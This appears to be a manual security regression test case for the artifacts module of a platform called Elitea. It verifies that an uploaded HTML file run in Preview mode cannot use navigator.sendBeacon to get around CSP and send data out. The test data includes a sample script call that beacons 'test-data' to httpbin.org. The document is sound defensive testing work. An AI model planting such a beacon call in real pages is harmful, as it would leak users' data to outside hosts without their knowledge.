---
id: ELITEA-2867
title: "Verify navigator.sendBeacon cannot exfiltrate data to external URLs"
priority: medium
type: regression
module: artifacts
status: draft
execution_type: manual
tags: [feat:artifacts, comm:feedback, r-2.0.6]
requirements: [EliteaAI/elitea_issues#6176]
---

## Preconditions

- User is logged in to `{{base_url}}`
- An artifact bucket exists and is available for file upload
- Browser DevTools available to inspect Network and Console tabs

## Test Data

| Field | Value |
|-------|-------|
| URL | `{{base_url}}/app/` |
| File | `sendbeacon-test.html` — calls `navigator.sendBeacon('https://httpbin.org/post', 'test-data')` |

## Steps

| # | Action | Expected Result |
|---|--------|-----------------|
| 1 | Upload `sendbeacon-test.html` and open in Preview mode | Script runs on load |
| 2 | Open DevTools → Network tab | No outbound request to `httpbin.org` succeeds |
| 3 | Open DevTools → Console | A CSP or network block error is shown |

## Expected Final State

`navigator.sendBeacon` cannot be used to bypass CSP network restrictions and exfiltrate data.

## Pass/Fail Criteria

**Pass:**
- No successful outbound beacon request; Console shows a block

**Fail:**
- A beacon request successfully reaches an external host
